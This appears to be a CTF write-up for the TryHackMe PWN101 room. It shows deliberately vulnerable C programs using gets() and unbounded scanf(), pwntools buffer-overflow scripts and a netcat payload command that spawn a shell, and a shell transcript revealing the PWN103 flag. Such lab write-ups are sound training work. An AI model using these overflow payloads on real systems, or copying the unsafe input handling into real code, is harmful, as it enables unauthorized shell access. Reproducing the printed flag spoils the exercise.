## Table of Contents

  - [Table of Contents](#Table\of\Contents)
    - [Challenge 1(pwn101.pwn101)](#Challenge\1(pwn101.pwn101))
          - [Source Code](#Source\Code)
- [simple pwntools script](#simple\pwntools\script)
  - [PWN 102 - Modify Variable's value](#PWN\102\-\Modify\Variable's\value)
      - [Step 1: Analyzing the Source Code](#Step\1:\Analyzing\the\Source\Code)
      - [Step 2: Identifying Vulnerabilities](#Step\2:\Identifying\Vulnerabilities)
      - [Step 3: Check Binary Security](#Step\3:\Check\Binary\Security)
      - [Step 4: Crafting the Payload](#Step\4:\Crafting\the\Payload)
      - [Step 5: Exploitation](#Step\5:\Exploitation)
      - [Step 6: Interacting with the Shell](#Step\6:\Interacting\with\the\Shell)
  - [PWN103](#PWN103)

## Table of Contents

    - [Challenge 1(pwn101.pwn101)](#Challenge\1(pwn101.pwn101))
          - [Source Code](#Source\Code)
- [simple pwntools script](#simple\pwntools\script)
  - [PWN 102 - Modify Variable's value](#PWN\102\-\Modify\Variable's\value)
      - [Step 1: Analyzing the Source Code](#Step\1:\Analyzing\the\Source\Code)
      - [Step 2: Identifying Vulnerabilities](#Step\2:\Identifying\Vulnerabilities)
      - [Step 3: Check Binary Security](#Step\3:\Check\Binary\Security)
      - [Step 4: Crafting the Payload](#Step\4:\Crafting\the\Payload)
      - [Step 5: Exploitation](#Step\5:\Exploitation)
      - [Step 6: Interacting with the Shell](#Step\6:\Interacting\with\the\Shell)
  - [PWN103](#PWN103)

[Room - PWN101(THM)](https://tryhackme.com/room/pwn101)
### Challenge 1(pwn101.pwn101)
###### Source Code
```C
#include <stdio.h>
#include <stdlib.h>

void setup(){
    setvbuf(stdout,(char *)0x0,2,0);
    setvbuf(stderr,(char *)0x0,2,0);
    setvbuf(stdin,(char *)0x0,2,0);
}

void banner(){
    puts(
"       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐\n"
"        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ \n"
"        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘\n"
"                 pwn 101          \n"
    );
}

void main(){
    char inp[50];
    int is1337 = 1337;
    setup();
    banner();

    puts("Hello!, I am going to shopping.\n"
    "My mom told me to buy some ingredients.\n"
    "Ummm.. But I have low memory capacity, So I forgot most of them.\n"
    "Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D\n");
    puts("Type the required ingredients to make briyani: ");
    gets(inp);

    if (is1337 == 1337){
        puts("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/");
        exit(1337);
    }
    else{
        puts("Thanks, Here's a small gift for you <3");
        system("/bin/sh");
    }
}
```

As you can see, `inp[50]`(the buffer) is passed to `gets()`. This is a dangerous function in C. We can clearly see the code is checking if preset_value is 1337 if it not, we get a shell.

The objective is to rewrite preset_value to something other than 1337.

Since we are taking input from `gets`, which is a dangerous function as it doesn't limit user input. Entering more charactrers than the `inp` (input buffer) accepts will overwrite the preset_value, thus giving us a shell.
```python
# simple pwntools script
from pwn import *

payload = b'A'*100

write("payload.txt",payload)

```
Running the exploit
```bash
(cat payload.txt;cat) | nc MACHINE_IP 9001
```

## PWN 102 - Modify Variable's value
```C
#include <stdio.h>
#include <stdlib.h>

void setup(){
    setvbuf(stdout,(char *)0x0,2,0);
    setvbuf(stderr,(char *)0x0,2,0);
    setvbuf(stdin,(char *)0x0,2,0);
}

void banner(){
    puts(
"       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐\n"
"        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ \n"
"        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘\n"
"                 pwn 102          \n"
    );
}

void main(){
    setup();
    banner();
    char is_this_right[100];
    int need_what = 0xBADF00D;
    int to_do = 0xFEE1DEAD;

    printf("I need %x to %x\nAm I right? ",need_what,to_do);
    scanf("%s",&is_this_right);

    if (need_what == 0xc0ff33 && to_do == 0xc0d3){
        printf("Yes, I need %x to %x\n",need_what,to_do);
        system("/bin/sh");
    }
    else{
        printf("I'm feeling dead, coz you said I need bad food :(\n");
        exit(1337);
    }
}
```

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF("./pwn102", checksec=False)

if args.REMOTE:
    p = remote("10.10.16.209", 9002)
else:
    p = process(binary.path)

payload = b""
payload += 104*b"A"
payload += p32(0xc0d3)
payload += p32(0xc0ff33)

p.sendlineafter(b"Am I right? ", payload)
p.interactive()
```

#### Step 1: Analyzing the Source Code

The provided C code sets up an environment with `setup()` and prints a banner with `banner()`. The main logic involves:

- Declaring two integer variables, `need_what` and `to_do`, initialized to `0xBADF00D` and `0xFEE1DEAD` respectively.
- Reading user input into a char array `is_this_right` with `scanf()`.
- A condition checks if `need_what` equals `0xc0ff33` and `to_do` equals `0xc0d3`. If true, it executes `/bin/sh`.

#### Step 2: Identifying Vulnerabilities

The main vulnerability lies in using `scanf()` to read into `is_this_right` without limiting input length, allowing for a buffer overflow.

#### Step 3: Check Binary Security

Using `checksec`, we find:

- No stack canary.
- Non-executable stack (NX enabled).
- Position Independent Executable (PIE enabled).

This indicates a buffer overflow can overwrite local variables but not inject and execute shellcode directly on the stack.

#### Step 4: Crafting the Payload

The Python script uses pwntools to automate exploitation:

1. Creates a payload with `104 * "A"` to fill the buffer and reach the variables in the stack.
2. Overwrites `to_do` with `0xc0d3` (4 bytes) and `need_what` with `0xc0ff33` (4 bytes).

#### Step 5: Exploitation

- The script sends the payload when prompted.
- The buffer overflow overwrites `need_what` and `to_do`.
- This triggers the conditional statement, opening a shell.

#### Step 6: Interacting with the Shell

After running the script, we use the shell to execute commands on the target system.

## PWN103
Welcome admin 😄
$ ls
flag.txt
pwn103
pwn103.c
$ cat flag.txt
`THM{w3lC0m3_4Dm1N}`
$ cat pwn103.x
$ cat pwn103.c
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void setup(){
    setvbuf(stdout,(char *)0x0,2,0);
    setvbuf(stderr,(char *)0x0,2,0);
    setvbuf(stdin,(char *)0x0,2,0);
}

void rules(){
    printf("\n📜 Rules:\n\n");
    printf("1️⃣  Don't ping @everyone 😾\n");
    printf("2️⃣  Don't rick roll anyone 😒 Rick roll yourself 😎\n");
    printf("3️⃣  Don't post memes 😑, otherwise you'll become a meme 🤡\n");
    printf("4️⃣  We know sharing is caring 🤗, But don't share your writeups here lmao🤦‍♂\n");
    printf("5️⃣  Respect everyone in our community🤗\n\n");
    main();
}

void announcements(){
    printf("\n📢 Announcements:\n\n");
    printf("A new room is available!\n");
    printf("Check it out: \033[0;34mhttps://tryhackme.com/room/binaryexploitation\033[0m\n\n");
    puts(
"┌┐ ┬┌┐┌┌─┐┬─┐┬ ┬┌─┐─┐ ┬┌─┐┬  ┌─┐┬┌┬┐┌─┐┌┬┐┬┌─┐┌┐┌\n"
"├┴┐││││├─┤├┬┘└┬┘├┤ ┌┴┬┘├─┘│  │ ││ │ ├─┤ │ ││ ││││\n"
"└─┘┴┘└┘┴ ┴┴└─ ┴ └─┘┴ └─┴  ┴─┘└─┘┴ ┴ ┴ ┴ ┴ ┴└─┘┘└┘\n");
    printf("👾 Beinner level room has some challenges based on stack exploitation\n\n");
    main();
}

void general(){
    char message[20];

    printf("\n🗣  General:\n\n");
    printf("------[jopraveen]: Hello pwners 👋\n");
    printf("------[jopraveen]: Hope you're doing well 😄\n");
    printf("------[jopraveen]: You found the vuln, right? 🤔\n\n");
    printf("------[pwner]: ");
    scanf("%s",&message);
    if (strcmp(message,"yes") == 0){
        printf("------[jopraveen]: GG 😄\n\n");
        main();
    }
    else{
        printf("Try harder!!! 💪\n");
    }
}

void bot_cmd(){
    char command[10];
    printf("🤖 Bot commands:\n\n");
    for (int i = 0; i < 4; ++i)
    {
        printf("root@pwn101:~/root# ");
        read(0,&command,10);
        if (strncmp(command,"/help",5) == 0){
            printf("\n⚙️  Available commands:\n\n");
            printf("/rank\n");
            printf("/invite\n");
            printf("/help\n");
            printf("/meme\n\n");
        }
        else if (strncmp(command,"/rank",5) == 0){
            puts(
            "\n┌───────────────────┐\n"
            "│  ╔═══╗ pwner      │\n"
            "│  ╚═╦═╝ rank: 1337 |\n"
            "╞═╤══╩══╤═══════════╡\n"
            "│ level : 18        │\n"
            "└───────────────────┘\n"
            );
        }
        else if (strncmp(command,"/invite",7) == 0){
            printf("\nOur Discord server link: \033[0;34mhttps://discord.gg/JxhCHPajsv\033[0m\n\n");
        }
        else if (strncmp(command,"/meme",5) == 0){
            puts(
            "\n░░▄▀░░░░░░░░░░░░░░░▀▀▄▄░░░░░ \n"
            "░░▄▀░░░░░░░░░░░░░░░░░░░░▀▄░░░\n"
            "░▄▀░░░░░░░░░░░░░░░░░░░░░░░█░░\n"
            "░█░░░░░░░░░░░░░░░░░░░░░░░░░█░\n"
            "▐░░░░░░░░░░░░░░░░░░░░░░░░░░░█\n"
            "█░░░░▀▀▄▄▄▄░░░▄▌░░░░░░░░░░░░▐\n"
            "▌░░░░░▌░░▀▀█▀▀░░░▄▄░░░░░░░▌░▐\n"
            "▌░░░░░░▀▀▀▀░░░░░░▌░▀██▄▄▄▀░░▐\n"
            "▌░░░░░░░░░░░░░░░░░▀▄▄▄▄▀░░░▄▌\n"
            "▐░░░░▐░░░░░░░░░░░░░░░░░░░░▄▀░\n"
            "░█░░░▌░░▌▀▀▀▄▄▄▄░░░░░░░░░▄▀░░\n"
            "░░█░░▀░░░░░░░░░░▀▌░░▌░░░█░░░░\n"
            "░░░▀▄░░░░░░░░░░░░░▄▀░░▄▀░░░░░\n"
            "░░░░░▀▄▄▄░░░░░░░░░▄▄▀▀░░░░░░░\n"
            "░░░░░░░░▐▌▀▀▀▀▀▀▀▀░░░░░░░░░░░\n"
            "░░░░░░░░█░░░░░░░░░░░░░░░░░░░░\n"
            "░░╔═╗╔═╗╔═╗░░░░░║░║╔═╗║░║░░░░\n"
            "░░╠═╣╠╦╝╠╣░░░░░░╚╦╝║░║║░║░░░░\n"
            "░░║░║║╚═╚═╝░░░░░░║░╚═╝╚═╝░░░░\n"
            "║╔═░╦░╦═╗╦═╗╦╔╗║╔═╗░░╔╦╗╔═╗╔╗\n"
            "╠╩╗░║░║░║║░║║║║║║═╗░░║║║╠╣░╔╝\n"
            "║░╚░╩░╩═╝╩═╝╩║╚╝╚═╝░░║║║╚═╝▄░\n\n"
            );
        }
    }
    main();
}

void discussion(){
    printf("\n🏠 rooms discussion:\n\n");
    printf("--[Welcome to Room Discussion]--\n\n");
    printf("-----[jopraveen]: Don't post spoilers here 🙂\n");
    printf("-----[jopraveen]: Keep the chats relevent to this room 🙂\n");
    printf("-----[jopraveen]: Good luck everyone 😄\n\n");
    main();
}

void banner(){
    puts(
"\033[0;34m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n"
"⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿\n"
"⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿\n"
"⣿⣿⣿⡇⠄⠄⠄\033[0;37m⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄\033[0;34m⠄⠄⠄⢸⣿⣿⣿\n"
"⣿⣿⣿⡇⠄⠄\033[0;37m⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄\033[0;34m⠄⠄⢸⣿⣿⣿\n"
"⣿⣿⣿⡇⠄⠄\033[0;37m⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿\033[0;34m⠄⠄⢸⣿⣿⣿\n"
"⣿⣿⣿⡇⠄⠄\033[0;37m⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛\033[0;34m⠄⠄⢸⣿⣿⣿\n"
"⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿\n"
"⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿\n"
"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿\n"
"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n\n"
"  [THM Discord Server]\033[0m\n"
);
}

void admins_only(){
    char command[7];
    printf("\n👮  Admins only:\n\n");
    printf("Welcome admin 😄\n");
    system("/bin/sh");
}

void main(){
    setup();
    banner();
    int option;

    printf("➖➖➖➖➖➖➖➖➖➖➖\n");
    printf("1) 📢 Announcements\n2) 📜 Rules\n3) 🗣  General\n4) 🏠 rooms discussion\n5) 🤖 Bot commands\n");
    printf("➖➖➖➖➖➖➖➖➖➖➖\n");
    printf("⌨️  Choose the channel: ");
    scanf("%d",&option);

    switch(option){
        case 1: announcements();break;
        case 2: rules();break;
        case 3: general();break;
        case 4: discussion();break;
        case 5: bot_cmd();break;
        default: main();
    }
}
```